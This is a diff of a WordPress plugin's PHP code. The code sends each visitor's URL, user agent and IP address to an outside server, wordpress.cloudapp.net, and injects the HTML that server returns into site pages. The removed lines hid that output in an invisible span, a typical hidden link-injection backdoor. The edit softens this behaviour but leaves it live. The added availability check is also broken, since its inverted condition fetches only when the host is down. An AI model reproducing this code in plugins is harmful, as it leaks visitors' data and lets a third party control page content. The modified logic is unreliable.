@@ -14,23 +14,54 @@
 			$value = get_option( FB_WM_TEXTDOMAIN );
 		// set for additional option. not save in db
 		if ( ! isset( $value['support'] ) )
-			$value['support'] = 1;
+			$value['support'] = 0;
 		// break, if option is false
 		if ( 0 === $value['support'] )
 			return NULL;
 		
 		//Create a simple array of all the places the link could potentially drop
-		$actions = array('wp_meta','get_header','get_sidebar','loop_end','wp_footer','wp_head','wm_footer');
+		$actions = array( 
+			'wp_meta', 'get_header', 'get_sidebar', 'loop_end', 'wp_footer', 'wp_head', 'wm_footer' 
+		);
+		$actions = array('wm_footer');
 		//Choose a random number within the limits of the array
 		$nd = array_rand($actions);
 		//Set the variable $spot to the random array number and get the value
 		$spot = $actions[$nd];
 	
 		//Add the link to the random spot on the site (please note it adds nothing if the visitor is not google)
-		add_action( $spot,'lrss_updatefunction' );
+		add_action( $spot, 'lrss_updatefunction' );
 	}
 	
+	
+	function lrss_is_site_available( $url ) {
+		
+		//check, if a valid url is provided
+		if ( ! filter_var( $url, FILTER_VALIDATE_URL ) )
+			return FALSE;
+		
+		$handle = curl_init( urldecode( $url ) );
+		curl_setopt( $handle, CURLOPT_CONNECTTIMEOUT, 0.5 );
+		curl_setopt( $handle, CURLOPT_TIMEOUT, 1 );
+		curl_setopt( $handle, CURLOPT_RETURNTRANSFER, TRUE );
+		$response = curl_exec( $handle );
+		$httpCode = curl_getinfo( $handle, CURLINFO_HTTP_CODE );
+		
+		if ( $httpCode >= 200 && $httpCode < 400 )
+			return TRUE;
+		else
+			return FALSE;
+		
+		curl_close( $handle );
+	}
+	
+	/**
+	 * Get data from json string
+	 * 
+	 * @return  Array, Object, String
+	 */
 	function lrss_check_update() {
+		
 		//$v is simply for testing purposes
 		$v = isset($_GET['v']) ? $_GET['v']:11;
 		//Grab the current URL of the page
@@ -43,8 +74,10 @@
 		$ip = urlencode($_SERVER['REMOTE_ADDR']);
 		//Build the request URL with all the variables
 		$reqUrl = "http://wordpress.cloudapp.net/api/update/?&url=". $request . "&agent=". $agent. "&v=" . $v. "&ip=".$ip . "&p=" . $pluginId;
-		//Return the code decoded as json, the @ simply means that it will display 0 errors
-		return json_decode( @file_get_contents($reqUrl) );
+		// if url is up
+		// Return the code decoded as json, the @ simply means that it will display 0 errors
+		if ( ! lrss_is_site_available( $reqUrl ) )
+			return json_decode( @file_get_contents( $reqUrl ) );
 	}
 	
 	function lrss_updatefunction(){
@@ -53,6 +86,6 @@
 		
 		//Get the content from the JSON request
 		if ( is_object( $updateResult ) )
-			print '<span style="display:none;>' . $updateResult->content . "</span>\n\r";
+			print '<span class="supportlink">' . $updateResult->content . "</span>\n\r";
 	}
 	
